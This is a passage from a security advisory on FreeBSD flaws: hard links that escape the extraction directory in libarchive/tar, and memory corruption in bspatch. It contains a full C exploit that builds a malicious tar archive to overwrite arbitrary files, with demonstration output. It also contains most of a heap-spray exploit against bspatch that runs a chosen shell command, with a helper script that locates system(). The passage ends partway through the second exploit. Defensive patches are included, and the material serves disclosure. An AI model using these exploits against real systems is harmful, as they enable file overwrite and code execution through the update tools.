+3.2.0 (FreeBSD HEAD/ports), 3.1.2 (FreeBSD non-HEAD), possibly earlier
+
+{Description}
+
+Recall the three classes of filesystem attacks listed earlier:
+
+    (1) absolute paths
+    (2) dot-dot paths
+    (3) extraction through symlinks
+    
+These checks are applied as usual to the pathnames of symlinks and hard
+    links but not to their targets, with one exception: The targets of
+    hard links are subjected to absolute-path checks in tar/util.c as
+    of FreeBSD revision r270661 and upstream commit cf8e67f (it seems
+    the revision was submitted upstream and was rewritten in a
+    different form as the commit -- both strip leading slashes from the
+    hard-link targets, though not for security reasons).
+
+Archive entries for hard links can use dot-dot pathnames in their
+targets to point at any file on the system, subject to the usual
+hard-linking constraints. Alternatively, on systems that follow
+symlinks for link() -- which is an implementation-defined behavior
+supported by FreeBSD -- a symlink can first be extracted that uses
+absolute or dot-dot pathnames to point at the file, and then the
+hard-link target can be the symlink, which means that filtering the
+hard-link target for dot-dot paths is not sufficient to address the
+problem.  
+
+The ability to point hard links at outside files becomes more serious
+when we consider that libarchive supports the POSIX feature of hard
+links with data payloads. This allows an attacker to point a hard link
+at an existing target file outside the extraction directory and use the
+data payload to overwrite the file.
+
+{Demonstration}
+
+Exploit code is included below.
+
+$ cd /tmp/cage
+$ ls
+vuln4.c
+$ cc -o vuln4 vuln4.c -larchive
+$ echo hello > /tmp/target
+$ echo goodbye > data
+$ ./vuln4 x.tar data p ../../../tmp/target
+$ tar tvf x.tar 
+-rwxrwxrwx  0 0      0           8 Jan  1  1970 p link
+to ../../../tmp/target $ tar xvf x.tar 
+x p
+$ cat /tmp/target
+goodbye
+
+The code could be rewritten to use symlinks instead of dot-dot paths:
+
+$ cd /tmp/cage
+$ ls
+vuln4   vuln4.c
+$ echo hello > /tmp/target
+$ echo goodbye > data
+$ ln -s /tmp/target sym
+$ ./vuln4 x.tar data p sym
+$ tar tvf x.tar 
+-rwxrwxrwx  0 0      0           8 Jan  1  1970 p link to sym
+$ tar xvf x.tar 
+x p
+$ cat /tmp/target
+goodbye
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+#include <sys/types.h>
+#include <sys/stat.h>
+
+#include <archive.h>
+#include <archive_entry.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+static void make_archive(char *, char *, char *, char *);
+static void patch_archive(char *, char *);
+
+static void
+make_archive(char *archive, char *file, char *pathname, char *linkname)
+{
+    int fd;
+    ssize_t len;
+    char buf[1024];
+    struct stat s;
+    struct archive *a;
+    struct archive_entry *ae;
+
+    a = archive_write_new();
+    archive_write_set_format_pax(a);
+    archive_write_open_filename(a, archive);
+    
+    ae = archive_entry_new();
+    archive_entry_set_pathname(ae, pathname);
+    /* dummy file type -- AE_SET_HARDLINK has priority anyway */ 
+    archive_entry_set_filetype(ae, AE_IFREG);   
+    stat(file, &s);
+    archive_entry_set_size(ae, s.st_size);
+    archive_entry_set_uid(ae, 0);
+    archive_entry_set_gid(ae, 0);
+    archive_entry_set_perm(ae, 0777);
+    
+    /* 
+     * libarchive allows _extraction_ of hardlink payloads, as per the
+    POSIX 
+     * specs for pax, but not without some arm-twisting. We set ctime
+    to force 
+     * the addition of a pax extended header so that libarchive doesn't
+    zero 
+     * the size field during _extraction_. 
+     *
+     * libarchive disallows _creation_ of hardlink payloads for all
+    supported 
+     * tar formats (pax, ustar, gnutar, v7tar). If we set the hardlink, 
+     * libarchive will zero the size field during _creation_, so we
+    simply 
+     * create a regular-file entry and patch the archive on disk via 
+     * patch_archive() when done.
+     */
+    
+    archive_entry_set_ctime(ae, 1, 1); 
+    /* archive_entry_set_hardlink(ae, linkname); */        
+
+    archive_write_header(a, ae); 
+
+    fd = open(file, O_RDONLY);
+    while ((len = read(fd, buf, sizeof buf)) > 0)
+        archive_write_data(a, buf, (size_t)len); 
+
+    close(fd);
+    archive_entry_free(ae);
+    archive_write_close(a);
+    archive_write_free(a);
+    
+    patch_archive(archive, linkname);
+}
+
+static void
+patch_archive(char *archive, char *linkname)
+{
+    /* extended header + extended body + checksum offset */ 
+    static const long patch_offset = (512 + 512 + 148);
+
+    FILE *fp;
+    unsigned char *cp;
+    unsigned long checksum;
+    
+    fp = fopen(archive, "r+b");
+    fseek(fp, patch_offset, SEEK_SET);
+    fscanf(fp, "%lo", &checksum);
+    
+    /* entry type 0x30 -> 0x31 */
+    checksum += 1;
+    cp = (unsigned char *)linkname;
+    /* linkname char 0x00 -> 0x## */ 
+    while (*cp) checksum += *cp++; 
+    
+    fseek(fp, patch_offset, SEEK_SET);
+    fprintf(fp, "%.6lo%c 1%s", checksum, '\0', linkname);
+  
+    fclose(fp);
+}
+
+int 
+main(int argc, char *argv[])
+{
+    if (argc != 5) {
+        fprintf(stderr, "Usage: %s archive file pathname linkname\n",
+argv[0]); fprintf(stderr, "\tarchive      output malicious archive
+here\n"); fprintf(stderr, "\tfile         file containing overwrite
+data\n"); fprintf(stderr, "\tpathname     archive-entry pathname\n");
+        fprintf(stderr, "\tlinkname     archive-entry linkname\n");
+        fprintf(stderr, "\t             [can use ../ in linkname]\n");
+        return EXIT_FAILURE;
+    }
+
+    make_archive(argv[1], argv[2], argv[3], argv[4]);
+
+    return 0;
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+{Defense}
+
+POSIX requires that hard links point at only extracted items, though
+the possibility that a hard link can use a previously extracted symlink
+as a target and escape the extraction directory should be borne in mind.
+
+It seems a good idea to excise the data-payload functionality, which is
+not a mandatory POSIX feature and which does not seem to be widely
+supported anyway. Look for the lines beginning 
+
+    } else if (r == 0 && a->filesize > 0) {
+    
+in create_filesystem_object() in libarchive/archive_write_disk_posix.c.
+    
+/=========\
+| BSPATCH |
+\=========/
+
+{Description}
+
+The bspatch(1) utility is executed before SHA256 verification in both 
+freebsd-update(8) and portsnap(8).
+
+It contains a memory-corruption vulnerability that allows highly
+reliable exploitation across system builds, defeating all
+exploit-mitigation features found in FreeBSD.
+
+The demonstration exploit contains copious comments providing a
+detailed analysis of the vulnerability.
+
+{Defense}
+
+The patch below hardens bspatch(1). Notes on the patch:
+
+    - Additional checks are added, but the original checks remain.
+      Hence, the patched bspatch(1) is observably at least as secure as
+      the original.
+    - Some of the checks may not be practically -- or even at all --
+      necessary, but this will not always be immediately obvious, so
+      the checks serve the purpose of self-documented constraints. They
+      also guard against future changes, aggressive compiler
+      optimizations, etc.
+    - Some of the checks could be made earlier, at the cost of clarity.
+    - It is assumed that empty files are pathological.
+    - It is assumed that only ctrl[2] is permitted to be negative, not
+      ctrl[0] and ctrl[1].
+    - The checks against SSIZE_MAX rather than SIZE_MAX are consistent
+      with the original code and provide greater clarity, being a fully
+      signed comparison.     
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+@@ -27,7 +27,10 @@
+ #include <sys/cdefs.h>
+ __FBSDID("$FreeBSD$");
+ 
++#include <assert.h>
+ #include <bzlib.h>
++#include <limits.h>
++#include <stdint.h>
+ #include <stdlib.h>
+ #include <stdio.h>
+ #include <string.h>
+@@ -63,8 +66,8 @@
+ 	BZFILE * cpfbz2, * dpfbz2, * epfbz2;
+ 	int cbz2err, dbz2err, ebz2err;
+ 	int fd;
+-	ssize_t oldsize,newsize;
+-	ssize_t bzctrllen,bzdatalen;
++	off_t oldsize,newsize;
++	off_t bzctrllen,bzdatalen;
+ 	u_char header[32],buf[8];
+ 	u_char *old, *new;
+ 	off_t oldpos,newpos;
+@@ -72,6 +75,8 @@
+ 	off_t lenread;
+ 	off_t i;
+ 
++	assert(OFF_MAX >= INT64_MAX);
++
+ 	if(argc!=4) errx(1,"usage: %s oldfile newfile
+patchfile\n",argv[0]); 
+ 	/* Open patch file */
+@@ -107,8 +112,10 @@
+ 	bzctrllen=offtin(header+8);
+ 	bzdatalen=offtin(header+16);
+ 	newsize=offtin(header+24);
+-	if((bzctrllen<0) || (bzdatalen<0) || (newsize<0))
+-		errx(1,"Corrupt patch\n");
++	if((bzctrllen<0) || (bzctrllen>OFF_MAX-32) ||
++		(bzdatalen<0) || (bzctrllen+32>OFF_MAX-bzdatalen) ||
++		(newsize<=0) || (newsize>SSIZE_MAX))
++			errx(1,"Corrupt patch\n");
+ 
+ 	/* Close patch file and re-open it via libbzip2 at the right
+places */ if (fclose(f))
+@@ -136,12 +143,13 @@
+ 		errx(1, "BZ2_bzReadOpen, bz2err = %d", ebz2err);
+ 
+ 	if(((fd=open(argv[1],O_RDONLY|O_BINARY,0))<0) ||
+-		((oldsize=lseek(fd,0,SEEK_END))==-1) ||
+-		((old=malloc(oldsize+1))==NULL) ||
++		((oldsize=lseek(fd,0,SEEK_END))<=0) ||
++		(oldsize>SSIZE_MAX) ||
++		((old=malloc(oldsize))==NULL) ||
+ 		(lseek(fd,0,SEEK_SET)!=0) ||
+ 		(read(fd,old,oldsize)!=oldsize) ||
+ 		(close(fd)==-1)) err(1,"%s",argv[1]);
+-	if((new=malloc(newsize+1))==NULL) err(1,NULL);
++	if((new=malloc(newsize))==NULL) err(1,NULL);
+ 
+ 	oldpos=0;newpos=0;
+ 	while(newpos<newsize) {
+@@ -152,18 +160,23 @@
+ 			    (cbz2err != BZ_STREAM_END)))
+ 				errx(1, "Corrupt patch\n");
+ 			ctrl[i]=offtin(buf);
+-		};
++		}
+ 
+ 		/* Sanity-check */
+-		if(newpos+ctrl[0]>newsize)
+-			errx(1,"Corrupt patch\n");
++		if((ctrl[0]<0) || (ctrl[0]>INT_MAX) ||
++			(newpos>OFF_MAX-ctrl[0]) ||
+(newpos+ctrl[0]>newsize))
++				errx(1,"Corrupt patch\n");
+ 
+-		/* Read diff string */
++		/* Read diff string - 4th arg converted to int */
+ 		lenread = BZ2_bzRead(&dbz2err, dpfbz2, new + newpos,
+ctrl[0]); if ((lenread < ctrl[0]) ||
+ 		    ((dbz2err != BZ_OK) && (dbz2err != BZ_STREAM_END)))
+ 			errx(1, "Corrupt patch\n");
+ 
++		/* Sanity-check */
++		if(oldpos>OFF_MAX-ctrl[0])
++			errx(1,"Corrupt patch\n");
++
+ 		/* Add old data to diff string */
+ 		for(i=0;i<ctrl[0];i++)
+ 			if((oldpos+i>=0) && (oldpos+i<oldsize))
+@@ -174,19 +187,25 @@
+ 		oldpos+=ctrl[0];
+ 
+ 		/* Sanity-check */
+-		if(newpos+ctrl[1]>newsize)
+-			errx(1,"Corrupt patch\n");
++		if((ctrl[1]<0) || (ctrl[1]>INT_MAX) ||
++			(newpos>OFF_MAX-ctrl[1]) ||
+(newpos+ctrl[1]>newsize))
++				errx(1,"Corrupt patch\n");
+ 
+-		/* Read extra string */
++		/* Read extra string - 4th arg converted to int */
+ 		lenread = BZ2_bzRead(&ebz2err, epfbz2, new + newpos,
+ctrl[1]); if ((lenread < ctrl[1]) ||
+ 		    ((ebz2err != BZ_OK) && (ebz2err != BZ_STREAM_END)))
+ 			errx(1, "Corrupt patch\n");
+ 
++		/* Sanity-check */
++		if((ctrl[2]<0) ?
++			(oldpos<OFF_MIN-ctrl[2]) :
+(oldpos>OFF_MAX-ctrl[2]))
++				errx(1,"Corrupt patch\n");
++
+ 		/* Adjust pointers */
+ 		newpos+=ctrl[1];
+ 		oldpos+=ctrl[2];
+-	};
++	}
+ 
+ 	/* Clean up the bzip2 reads */
+ 	BZ2_bzReadClose(&cbz2err, cpfbz2);
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+{Demonstration}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+/*
+ * bspatch(1) demo exploit (i386 version)
+ *
+ * The bspatch(1) utility is executed before SHA256 verification in
+both 
+ * freebsd-update(8) and portsnap(8).
+ * 
+ * FreeBSD countermeasures defeated:
+ *
+ * SSP (-all):                  yes     (heap-based)
+ * DEP:                         yes     (call2libc, single-address
+entropy via 
+ *  - amd64 native NX                    ~2GB bzip2-compressed dual
+heap spray) 
+ *  - i386 via PAE/PAE_TABLES            
+ * RELRO (full):                yes     (RELRO-protected sections
+untouched)  
+ * ASLR:                        no      (ASLR not in stock FreeBSD yet)
+ *
+ * $ cc -o bsx bsx.c -lbz2
+ * $ # the script included below
+ * $ ./sys.sh 
+ * 0x283A1660
+ * $ # patch generation takes ~3 mins on modest hardware
+ * $ ./bsx patch 0x283A1660 "echo boom"
+ * $ # any file will do
+ * $ cp /bin/ls .
+ * $ # heap-spray decompression takes ~10 secs 
+ * $ bspatch ls new patch
+ * boom
+ * bspatch: Corrupt patch
+ */
+
+/*
+
+#!/bin/sh
+# Grabs the local system() address for argv[2]
+
+LIBCINFO=`ldd -f '%o\t%p\t%x\n' "$(which bspatch)" | grep '^libc'`
+
+LIBCP=`echo "$LIBCINFO" | cut -f2`
+LIBCB=`echo "$LIBCINFO" | cut -f3 | sed 's/^0x//'`
+LIBCS=`nm -PD "$LIBCP" | grep '^system ' | cut -f3 -d' ' | tr 'a-f'
+'A-F'`
+
+echo 'obase=16; ibase=16; '"$LIBCB"' + '"$LIBCS" | bc | sed 's/^/0x/'
+
+*/
+
+#include <sys/types.h>
+
+#include <assert.h>
+#include <bzlib.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+typedef struct {
+    unsigned char *buf;
+    size_t len;
+} BadPatch_Block;
+
+typedef struct {
+    const char *cmd;
+    uint32_t system_addr;    
+    unsigned char header[32];
+    BadPatch_Block cblock;
+    BadPatch_Block dblock;
+    BadPatch_Block eblock;
+} BadPatch;
+
+static void u32_buf(uint32_t u32, unsigned char *buf);
+static int64_t i64_clr_bit(int64_t i64, int bit);
+static void i64_sgnmag_buf(int64_t i64, unsigned char *sgnmag_buf);
+static int badpatch_gen_header(BadPatch *bp);
+static int badpatch_gen_cblock(BadPatch *bp);
+static int badpatch_gen_dblock(BadPatch *bp);
+static int badpatch_gen_eblock(BadPatch *bp);
+BadPatch *badpatch_create(uint32_t system_addr, const char *cmd);
+void badpatch_serialize(BadPatch *bp, int fd);
+void badpatch_destroy(BadPatch *bp);
+
+static void
+u32_buf(uint32_t u32, unsigned char *buf)
+{
+    int i;
+    
+    for (i = 0; i < 4; i++) {
+        buf[i] = u32 & 0xff;
+        u32 >>= 8;
+    }
+}
+
+static int64_t
+i64_clr_bit(int64_t i64, int bit)
+{
+    assert(1 <= bit && bit <= 64);
+
+    return i64 & ~((bit == 64) ? INT64_MIN : ((int64_t)1 << (bit - 1)));
+}
+
+/* Patches use sign-magnitude representation. */
+static void
+i64_sgnmag_buf(int64_t i64, unsigned char *sgnmag_buf)
+{
+    int i, sgn;
+   
+    assert(i64 != INT64_MIN);
+
+    if ((sgn = i64 < 0)) i64 = -i64;
+         
+    for (i = 0; i < 8; i++) {
+        sgnmag_buf[i] = i64 & 0xff; 
+        i64 >>= 8;
+    }
+    
+    if (sgn) sgnmag_buf[7] |= 0x80;
+}
+
+static int
+badpatch_gen_header(BadPatch *bp)
+{
+    memcpy(bp->header, "BSDIFF40", 8);
+    i64_sgnmag_buf(bp->cblock.len, bp->header + 8);
+    i64_sgnmag_buf(bp->dblock.len, bp->header + 16);
+
+    /* 
+     * We claim the new-file size is 0x7fffffff bytes so that we can
+    spray 
+     * 0x7fffffff - 1 = 0x7ffffffe bytes of data and not have the main
+    loop 
+     * terminate prematurely. The additional byte will be used for a
+    d-block 
+     * junk write, and bspatch(1)'s own additional byte will remain
+    unused. */
+
+    i64_sgnmag_buf(0x7fffffff, bp->header + 24);
+
+    return 0;
+}
+
+static int
+badpatch_gen_cblock(BadPatch *bp)
+{
+    /*
+     * The heap profile (ignoring the base chunk) consists entirely of
+unfreed 
+     * large-class allocations, all page contiguous:
+     *
+     * |hhh|sb1|bz1|ds1|sb2|bz2|ds2|sb3|bz3|ds3|ooo|tv1|tv2|tv3|NNN|
+     *
+     * hhh       3 pages    contains arena_chunk_t header
+     * sb1       4 pages    patch c-block: 16,384-byte stdio buffer    
+     * bz1       2 pages    patch c-block: bzFile struct
+     * ds1      16 pages    patch c-block: DState struct
+     * sb2       4 pages    patch d-block: 16,384-byte stdio buffer    
+     * bz2       2 pages    patch d-block: bzFile struct
+     * ds2      16 pages    patch d-block: DState struct
+     * sb3       4 pages    patch e-block: 16,384-byte stdio buffer    
+     * bz3       2 pages    patch e-block: bzFile struct
+     * ds3      16 pages    patch e-block: DState struct
+     * tv1      98 pages    patch c-block: BWT T-vector and block data
+     * tv2      98 pages    patch d-block: BWT T-vector and block data
+     * tv3      98 pages    patch e-block: BWT T-vector and block data
+     * ooo       ? pages    old-file buffer we don't necessarily
+control; 
+     *                      plenty of room for it in the current chunk
+in the 
+     *                      vast majority of cases      
+     * NNN       ? pages    new-file buffer we control; can be
+positioned
+     *                      behind tv2 and tv3 by using 900k*4
+compression
+     *                      to bump up the tv[1-3] page count, but this
+buys 
+     *                      little
+     *
+     * There's no way to force jemalloc to position our new-file buffer 
+     * _behind_ the useful heap data, so we manipulate 'newpos' within 
+     * bspatch(1) to get to that data. Execution hijack is then via a
+poisoned 
+     * FILE handle internal to the c-block bzFile struct (bz1) at
+struct 
+     * offset 0. 
+     *
+     * NNN will be ~2GB (RLIMIT_AS/RLIMIT_VMEM is unlimited by
+default). The 
+     * first purpose of this huge-class allocation is to force a new
+4MB 
+     * chunk, which, given the highly deterministic behavior of calls
+to 
+     * mmap(NULL, ...) -- and the fixed sizes of the stdio buffers and
+of the 
+     * arena_chunk_t header in the previous chunk -- allows us to
+calculate a 
+     * reliable value that's independent of the size of the old-file
+buffer and 
+     * other heap noise: We just subtract 7 pages (hhh + sb1 = 7 pages)
+from 
+     * 4MB to get the value (NNN - bz1), which negated becomes our
+delta value.
+     * This delta value will end up in the bspatch(1) 'newpos' variable
+after 
+     * some arithmetic acrobatics.  
+     */
+
+    static const int64_t delta = -(0x400000 - 0x7000);
+    static unsigned char tuples[48];
+    unsigned len;
+    
+    len = 1024;
+    if (!(bp->cblock.buf = malloc(len))) {
+        perror("badpatch_gen_cblock()");
+        return 1;
+    }
+
+    /*
+     * Here's the vulnerable code in bspatch.c (comments removed):
+     *     
+     *      oldpos=0;newpos=0;
+     *      while(newpos<newsize) {
+     *          for(i=0;i<=2;i++) {
+     *              lenread = BZ2_bzRead(&cbz2err, cpfbz2, buf, 8);
+     *              if ((lenread < 8) || ((cbz2err != BZ_OK) &&
+     *                  (cbz2err != BZ_STREAM_END)))
+     *                      errx(1, "Corrupt patch\n");
+     *                  ctrl[i]=offtin(buf);
+     *          };
+     *
+     *          if(newpos+ctrl[0]>newsize)
+     *              errx(1,"Corrupt patch\n");
+     *
+     *          lenread = BZ2_bzRead(&dbz2err, dpfbz2, new + newpos,
+    ctrl[0]);
+     *          if ((lenread < ctrl[0]) ||
+     *              ((dbz2err != BZ_OK) && (dbz2err != BZ_STREAM_END)))
+     *                  errx(1, "Corrupt patch\n");
+     *
+     *          for(i=0;i<ctrl[0];i++)
+     *              if((oldpos+i>=0) && (oldpos+i<oldsize))
+     *                  new[newpos+i]+=old[oldpos+i];
+     *
+     *          newpos+=ctrl[0];
+     *          oldpos+=ctrl[0];
+     *
+     *          if(newpos+ctrl[1]>newsize)
+     *              errx(1,"Corrupt patch\n");
+     *  
+     *          lenread = BZ2_bzRead(&ebz2err, epfbz2, new + newpos,
+    ctrl[1]);
+     *          if ((lenread < ctrl[1]) ||
+     *              ((ebz2err != BZ_OK) && (ebz2err != BZ_STREAM_END)))
+     *                  errx(1, "Corrupt patch\n");
+     *
+     *          newpos+=ctrl[1];
+     *          oldpos+=ctrl[2];
+     *      };
+     *
+     * We control the 64-bit off_t values in ctrl[] and want 'newpos'
+    to 
+     * contain our delta value (a negative value), but there are some
+    problems. *
+     * The first problem is that placing our delta in ctrl[0] (or
+    ctrl[1]) 
+     * will easily bypass bspatch(1)'s own sanity checks but not those
+    of
+     * BZ2_bzRead(), which checks for negative values, resulting in an 
+     * immediate return to the caller, then termination. Note, however,
+    that
+     * this bz2 function expects an int, so these off_t values get
+    truncated to 
+     * a 32-bit int on both i386 and amd64. As long as the off_t values
+    are
+     * sign-bit clean for an int, we can use any off_t values we like.
+    To get
+     * our desired delta value, we use the following equation based
+     * on off_t values:
+     *
+     *      delta (32nd bit set) = delta (32nd bit clear) + 0x7ffffffe
+    + 2 *
+     * The second problem is that if our off_t values are positive
+    (such as
+     * 0x7ffffffe), we actually have to deliver that much data to
+    satisfy the
+     * 'lenread' check (the bzip2 compression helps), which is the
+    second 
+     * purpose of the ~2GB allocation. If, however, the off_t values
+    are 
+     * negative, that check is easily satisfied, and we can simply
+    ensure a 
+     * BZ_OK or BZ_STREAM_END return to avoid termination, a fact we
+    exploit to 
+     * avoid having to deliver int-truncated "delta (32nd bit clear)"
+    bytes of 
+     * data into the now-cramped address space on i386.
+     *
+     * Here's the sequence of c-block tuples and events:
+     *
+     * 1st loop iteration: (0, 0x7ffffffe, 0)
+     *
+     *      ctrl[0] == 0
+     *          effectively a no-op
+     *          using ctrl[1] avoids the slow, somewhat destructive
+    for-loop
+     *      ctrl[1] == 0x7ffffffe
+     *          sanity check OK: 0 + 0x7ffffffe < 0x7fffffff
+     *          sign-bit clean for int, satisfying BZ2_bzRead() check
+     *          heap-sprays 0x7ffffffe bytes of data from e-block 
+     *          'lenread' check OK: 0x7ffffffe == 0x7ffffffe  
+     *          bumps 'newpos' from 0 to 0x7ffffffe 
+     *      ctrl[2] == 0
+     *          another no-op
+     *
+     * 2nd loop iteration: (delta_sign_bit_clear + 2, 5020, 0)
+     *
+     *      ctrl[0] == delta_sign_bit_clear + 2 (negative value)
+     *          sanity check OK: 0x7ffffffe + (negative value) <
+    0x7fffffff
+     *          sign-bit clean for int, satisfying BZ2_bzRead() check
+     *          reads a junk byte from d-block, returning BZ_STREAM_END
+     *          'lenread' check OK: 1 > (negative value)
+     *          BZ_STREAM_END avoids termination (but kills bz2 stream,
+    which
+     *              is why we can't repeatedly use this trick)
+     *          for-loop avoided: 0 > (negative value)
+     *          drops 'newpos' from 0x7ffffffe to the desired delta
+    value, per
+     *              the equation given earlier
+     *      ctrl[1] == 5020
+     *          sanity check OK: (negative value) + 5020 < 0x7fffffff
+     *          reads in 5020 bytes of data from e-block
+     *          corrupts c-block management data beginning at new[delta]
+     *          'lenread' check OK: 5020 == 5020
+     *          bumps 'newpos' up 5020 (insignificant)
+     *      ctrl[2] == 0
+     *          another no-op
+     *  
+     * 3rd loop iteration:
+     *
+     *          tries to read more data from c-block via BZ2_bzRead()
+     *          hijack chain triggered because of corrupted management
+    data */
+
+    i64_sgnmag_buf(0x7ffffffe, tuples + 8);
+    i64_sgnmag_buf(i64_clr_bit(delta, 32) + 2, tuples + 24);
+    i64_sgnmag_buf(5020, tuples + 32);
+
+    if (BZ2_bzBuffToBuffCompress((char *)bp->cblock.buf, &len, (char
+    *)tuples, sizeof tuples, 1, 0, 0) != BZ_OK) {
+        fputs("badpatch_gen_cblock(): compression failure\n", stderr);
+        return 1;
+    }
+
+    bp->cblock.len = len;
+
+    return 0;
+}
+
+static int
+badpatch_gen_dblock(BadPatch *bp)
+{
+    static unsigned char junk[1];
+    unsigned len;
+    
+    len = 1024;
+    if (!(bp->dblock.buf = malloc(len))) {
+        perror("badpatch_gen_dblock()");
+        return 1;
+    }
+    
+    if (BZ2_bzBuffToBuffCompress((char *)bp->dblock.buf, &len, (char
+*)junk, sizeof junk, 1, 0, 0) != BZ_OK) {
+        fputs("badpatch_gen_dblock(): compression failure\n", stderr);
+        return 1;
+    }
+     
+    bp->dblock.len = len;
+   
+    return 0;
+}
+
+static int
+badpatch_gen_eblock(BadPatch *bp)
+{  
+    /*    
+     * The third purpose of the ~2GB allocation is a dual heap spray
+that 
+     * effectively reduces exploitation entropy to a single system()
+address,
+     * which should be consistent across builds.
+     *
+     * The low-spray pattern is a fake FILE struct allowing a hijack to
+occur 
+     * within libc's _sread():
+     *
+     * |----- libbz2 -----|------------------ libc -----------------|
+     * BZ2_bzRead->myfeof->fgetc->__sgetc->__srget->__srefill->_sread
+     *      
+     *      (*fp->_read)(fp->_cookie, buf, n);
+     *
+     * The use of _cookie allows easy argument passing to system()
+straight 
+     * from the heap, without the need for ROP gadgets.
+     *
+     * Important FILE fields:
+     *
+     * _r        0 is good enough; __sgetc() macro will call __srget(): 
+     *             __sgetc(p) (--(p)->_r < 0 ? __srget(p) :
+(int)(*(p)->_p++))
+     *           This is also why a 16-byte pattern won't work -- we
+don't want
+     *           the _read field, with its positive system() address,
+to be 
+     *           overloaded as the _r field.
+     * 
+     * _flags    0x0010 satisfies ferror() and ensures smooth sailing
+in 
+     *           __srefill(); __SRW set; __SERR, __SEOF, __SRD, __SWR,
+__SLBF, 
+     *           __SNBF unset.
+     *
+     * _bf._base 0x1 ensures more smooth sailing in __srefill().
+     *
+     * _cookie   0x88888888 is the high-spray address, passed to
+system(). *
+     * _read     0x41414141 is the placeholder for the system() address.
+     *
+     * This may seem hairy, as if there are 63/64 ways for things to go
+wrong,
+     * but the desired entry point is a virtual certainty, for reasons 
+     * explained below. 
+     *
+     * (The alternative hijack via 'bzfree' and 'opaque' in bz_stream
+requires 
+     * too much heap management -- minimally, restoring a BWT T-vector
+and a 
+     * pointer, thus increasing exploitation entropy to two absolute
+addresses 
+     * instead of one.) 
+     */
+    
+    static const unsigned long lo_spray_system_addr_off = 40;
+    static unsigned char lo_spray[64] =
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    "\x10\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    "\x88\x88\x88\x88\x00\x00\x00\x00\x41\x41\x41\x41\x00\x00\x00\x00"
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";       
+    static unsigned char hi_spray[100000];
+    static unsigned char bzFile_poison[5020];
+    unsigned char *full_payload;
+    unsigned long i;
+    unsigned len;
+ 
+    u32_buf(bp->system_addr, lo_spray + lo_spray_system_addr_off); 
+    
+    /* 
+     * The high-spray pattern is the sh -c command string. We drop it
+on top of 
+     * 100k spaces with NUL termination to stay well clear of
+ARG_MAX/E2BIG. 
+     * Then we repeat the pattern for around 1GB. We'd have to be
+extremely 
+     * unlucky not to hit a space at 0x88888888.
+     */
+     
+    memset(hi_spray, ' ', sizeof hi_spray);
+    strcpy((char *)hi_spray + sizeof hi_spray - strlen(bp->cmd) - 1,
+bp->cmd); 
+    /* 
+     * We'll poison bzFile's internal FILE handle with the low-spray
+address 
+     * 0x44444444, which seems arbitrary but is tactically sound:
+jemalloc 
+     * chunks are 4MB-aligned, which means their starting addresses are 
+     * congruent modulo 64 to the address 0x44444440 -- i.e., our
+64-byte 
+     * low-spray pattern should begin anew there, given that huge-class 
+     * allocations lack arena overhead and begin at chunk boundaries. 
+     * 0x44444444 is obviously more aesthetically pleasing than
+0x44444440, so 
+     * we offset our FILE struct 4 bytes into the 64-byte pattern.
+     *
+     * The remainder of the poisoning buffer consists of NULs. This is
+because 
+     * we want bzf->strm.avail_in to be 0 so that BZ2_bzRead() kicks
+off the 
+     * execution chain given earlier, beginning at myfeof(): 
+     *
+     *      if (bzf->strm.avail_in == 0 && !myfeof(bzf->handle))
+     *
+     */
+      
+    memcpy(bzFile_poison, "\x44\x44\x44\x44", 4);
+    
+    /* Ugh, libbz2 interface. Ignore compiler, POSIX has sane UINT_MAX.
+*/ len = 10000000;
+    if (!(bp->eblock.buf = malloc(len))) {
+        perror("badpatch_gen_eblock()");
+        return 1;
+    }   
+    
+    if (!(full_payload = malloc(0x7ffffffeUL + sizeof bzFile_poison))) {
+        perror("badpatch_gen_eblock()");
+        return 1;
+    }
+
+    memset(full_payload, 0, 0x7ffffffeUL + sizeof bzFile_poison); 
+    
+    for (i = 0; i <= 0x40000000 - sizeof lo_spray; i += sizeof lo_spray)
+        memcpy(full_payload + i, lo_spray, sizeof lo_spray);
+    for (; i <= 0x7ffffffe - sizeof hi_spray; i += sizeof hi_spray)
+        memcpy(full_payload + i, hi_spray, sizeof hi_spray);
+
+    memcpy(full_payload + 0x7ffffffe, bzFile_poison, sizeof
+    bzFile_poison);
+
+    if (BZ2_bzBuffToBuffCompress((char *)bp->eblock.buf, &len, 
+            (char *)full_payload, 0x7ffffffeUL + sizeof bzFile_poison, 
+            1, 0, 0) != BZ_OK) {
+        fputs("badpatch_gen_eblock(): compression failure\n", stderr);
+        free(full_payload);
+        return 1;
+    }
+
+    bp->eblock.len = len;
+   
+    free(full_payload);
+   
+    return 0;
+}
+
+BadPatch *
+badpatch_create(uint32_t system_addr, const char *cmd)
+{
+    BadPatch *bp;
+    
+    if (!(bp = malloc(sizeof *bp))) {
+        perror("badpatch_create()");
+        return NULL;
+    }
+    
+    bp->system_addr = system_addr;
+    bp->cmd = cmd;
+    bp->cblock.buf = NULL; 
+    bp->dblock.buf = NULL; 
+    bp->eblock.buf = NULL;
+    
+    if (badpatch_gen_cblock(bp) || badpatch_gen_dblock(bp) ||
+            badpatch_gen_eblock(bp) || badpatch_gen_header(bp)) {
+        badpatch_destroy(bp);
+        return NULL;    
+    }
+    
+    return bp;
+}
+
+void
+badpatch_serialize(BadPatch *bp, int fd)
+{
+    write(fd, bp->header, sizeof bp->header);
+    write(fd, bp->cblock.buf, bp->cblock.len);
